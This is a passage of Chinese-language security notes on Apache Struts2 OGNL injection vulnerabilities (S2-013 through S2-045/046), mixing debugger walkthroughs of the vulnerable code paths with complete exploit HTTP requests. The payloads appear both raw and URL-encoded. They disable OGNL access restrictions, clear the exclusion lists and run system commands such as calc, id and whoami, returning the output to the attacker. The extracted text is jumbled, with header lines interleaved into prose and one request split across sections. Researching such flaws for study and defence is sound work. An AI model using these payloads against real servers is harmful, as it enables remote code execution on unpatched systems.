%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2
e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%
29%7d HTTP/1.1
1
Host: localhost:8082
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
3
漏洞分析
index.jsp ⻓这个样⼦
在S2中s:url和s:a这两个标签都提供了includeParams属性，这个属性主要是⽤于标志是否包含
http请求参数。
 none: URL中不包含参数
 get：URL中只包含GET型参数
 all：URL中包含GET型和POST型参数
⽽当URL中带有参数的时候，S2会⼆次处理URL，如果参数中包含恶意的Ognl语句，那么就
会按照Ognl语法解析。 
直接来到org.apache.struts2.views.util.DefaultUrlHelper#buildParametersString
org.apache.struts2.views.util.DefaultUrlHelper#buildParameterSubstring
处理url字符串
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
5
Accept-Encoding: gzip, deflate
6
Referer: http://localhost:8082/s2_01_war_exploded/
7
Connection: close
8
Cookie: JSESSIONID=300F3E7CF2F6AF9D58219502308B9A9E; 
UM_distinctid=175f2e14ced80d-00391c626d990b-4c3f2779-190140-
175f2e14cee91a; CNZZDATA1279152423=1639523356-1606094476-%7C1606094476; 
_jspxcms=e7fd1bb11f1a420d9a3f644e6f1682c3
9
Upgrade-Insecure-Requests: 1
10
Cache-Control: max-age=0
11
"s:a" tag
1
"s:url" tag
2
跟进去
最后进⼊org.apache.struts2.views.util.DefaultUrlHelper#translateAndEncode
注意⼀下：TextParseUtil.translateVariables(input, valueStack)就是最终解析OGNL表达式的
地⽅ 命令执⾏
关于⼆次解析
第⼀次解析标签 将payload识别为OGNL表达式
第⼆次OGNL表达式解析执⾏payload
修复及绕过
013的修复通过限制%{(#exp)}，%{exp}被忽略了，这也就是014
最终的修复⽅案translateAndEncode 只保留encode功能
2.6 S2-015
POC
漏洞产⽣于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执⾏ 
OGNL 表达式，例如：
        /{1}.jsp
上述配置能让我们访问 name.action 时使⽤ name.jsp 来渲染⻚⾯，但是在提取 
name 并解析时，对其执⾏了 OGNL 表达式解析，所以导致命令执⾏。在实践复现的
时候发现，由于 name 值的位置⽐较特殊，⼀些特殊的字符如 / " \ 都⽆法使⽤（转
义也不⾏），所以在利⽤该点进⾏远程命令执⾏时⼀些带有路径的命令可能⽆法执⾏
成功。
还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 
SecurityMemberAccess 类中的 setAllowStaticMethodAccess ⽅法，因此在 
2.3.14.2 版本以后都不能直接通
过  #_memberAccess['allowStaticMethodAccess']=true  来修改其值达到重获静态⽅法
调⽤的能⼒。
这⾥为了到达执⾏命令的⽬的可以⽤ kxlzx 提到的调⽤动态⽅法 (new 
java.lang.ProcessBuilder('calc')).start() 来解决，另外还可以借助 Java 反射机制去
间接修改：
#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAcces
s.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.
set(#_memberAccess,true)
http://localhost:8080/example/HelloWorld.action?message=${%{1+2}} 
1
可以构造 Payload 如下：
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAcce
ss.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m
.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.
Runtime@getRuntime().exec('id').getInputStream()),#q}
2.7 S2-016
在struts2中，DefaultActionMapper类⽀持以"action:"、"redirect:"、"redirectAction:"作
为导航或是重定向前缀，但是这些前缀后⾯同时可以跟OGNL表达式，由于struts2没有对
这些前缀做过滤，导致利⽤OGNL表达式调⽤java静态⽅法执⾏任意系统命令。
所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执⾏OGNL表达
式。
执⾏命令：
${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAc
cess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessib
le(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().ex
ec("calc").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new 
java.io.BufferedReader(#b),#d=new 
char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispa
tcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(
),#genxor.close()}
1
2
 GET /s2_01_war_exploded/others.action?
redirect:%24%7b%23%63%6f%6e%74%65%78%74%5b%22%78%77%6f%72%6b%2e%4d%65%74%6
8%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%
63%75%74%69%6f%6e%22%5d%3d%66%61%6c%73%65%2c%23%66%3d%23%5f%6d%65%6d%62%65
%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%6
3%6c%61%72%65%64%46%69%65%6c%64%28%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%
65%74%68%6f%64%41%63%63%65%73%73%22%29%2c%23%66%2e%73%65%74%41%63%63%65%73
%73%69%62%6c%65%28%74%72%75%65%29%2c%23%66%2e%73%65%74%28%23%5f%6d%65%6d%6
2%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%61%3d%40%6a%61%76%61%2e%
6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29
%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%7
2%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%
75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77
3
2.8 S2-032
漏洞复现
%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%2
3%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%5d%2c%23%63%2e%
72%65%61%64%28%23%64%29%2c%23%67%65%6e%78%6f%72%3d%23%63%6f%6e%74%65%78%74
%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%7
7%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%
6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2e%67%65%74%57%72%69%74%65%72%28%29
%2c%23%67%65%6e%78%6f%72%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%67%65%6
e%78%6f%72%2e%66%6c%75%73%68%28%29%2c%23%67%65%6e%78%6f%72%2e%63%6c%6f%73%
65%28%29%7d%0a HTTP/1.1
Host: localhost:8082
4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
5
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
6
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
7
Accept-Encoding: gzip, deflate
8
Referer: http://localhost:8082/s2_01_war_exploded/
9
Connection: close
10
Cookie: JSESSIONID=5E8CDF0642287AF580ACD2A831D2BB98; 
UM_distinctid=175f2e14ced80d-00391c626d990b-4c3f2779-190140-
175f2e14cee91a; CNZZDATA1279152423=1639523356-1606094476-%7C1606094476; 
_jspxcms=e7fd1bb11f1a420d9a3f644e6f1682c3
11
Upgrade-Insecure-Requests: 1
12
Cache-Control: max-age=0
13
漏洞原理
GET /s2_01_war_exploded/others.action?
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3
d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setChar
acterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23
s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23paramete
rs.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23
str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%
23str),%23w.close(),1?
%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=calc 
HTTP/1.1
1
Host: localhost:8082
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
3
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
5
Accept-Encoding: gzip, deflate
6
Referer: http://localhost:8082/s2_01_war_exploded/
7
Connection: close
8
Upgrade-Insecure-Requests: 1
9
Cache-Control: max-age=0
10
Struts2在开启了动态⽅法调⽤（Dynamic Method Invocation）的情况下，可以使⽤
method:的⽅式来调⽤名字是的⽅法，⽽这个⽅法名将会进⾏OGNL表达式计
算，导致远程命令执⾏漏洞。 
这⾥回头再看下poc   
将_memberAccess赋值成DEFAULT_MEMBER_ACCESS是为绕过SecurityMemberAccess为
false的限制
2.9 S2-045 / 046
这⾥我们直接使⽤showcase https://github.com/apache/struts/tree/STRUTS_2_5_10/a
pps/showcase 下载下来直接⽤idea打开配置tomcat即可
method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.ap
ache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(
#parameters.encoding[0]),#w=#res.getWriter(),#s=new 
java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0])
.getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?
#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?
#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=calc
1
漏洞分析
S2漏洞太多了.....漏洞要跟吐了，直接就看现成的了
⽹上写的⽐较好的⽂章都是从diﬀ开始讲的，diﬀ发现
从漏洞简述中可以得知是struts在处理 Content-Type 时如果获得未期预的值的话，将会爆
出⼀个异常，在此异常的处理中可能会造成RCE。同时在漏洞的描述中可以得知Struts2在
使⽤基于 Jakarta Multipart 解析器来处理⽂件上传时，可能会造成RCE。
Jakarta Multipart 解析器在Struts2中存在于
org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest 是默认组件之⼀，⾸先把这
⼀点记录下来。 
根据diﬀ所得结果，跟进 validation 的执⾏流程，就如漏洞描述中所述， validation 的调⽤
位于Struts2的 FileUploadInterceptor 也就是处理⽂件上传的拦截器中。 
这⾥有个拦截器的概念，涉及到S2的架构，总之就是请求过来了过滤器堆所有七年跪求都起
到作⽤，主要⽤来堆请求添加、修改或者分派转发⾄Action。
GET /struts2_showcase_war/index HTTP/1.1
1
Host: localhost:8082
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
3
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
5
Accept-Encoding: gzip, deflate
6
Connection: close
7
Content-Type:"%{(#nike='multipart/form-data').
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?
(#_memberAccess=#dm):
((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@c
lass)).(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).
(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=
(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new 
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
(#process=#p.start()).(#ros=
(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())
).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
(#ros.flush())}"
8
Upgrade-Insecure-Requests: 1
9
这⾥就直接对FileUploadInterceptor下断点来调试，直接断点到错误处理部分，
然后跟进com.opensymphony.xwork2.util.LocalizedTextUtil#ﬁndText(java.lang.Class, 
java.lang.String, java.util.Locale, java.lang.String, java.lang.Object[])
这⾥有个valueStack，这个就是存储ongl各个节点的⼀个栈
接着进来了com.opensymphony.xwork2.util.LocalizedTextUtil#getDefaultMessage 跟进去
看到了TextParseUtil.translateVariables，跟进
TextParseUtil.translateVariables，这⾥会提取ognl表达式并执⾏
最后程序在 parser 的evaluate⽅法中执⾏了 ognl表达式。 
我此时的调⽤栈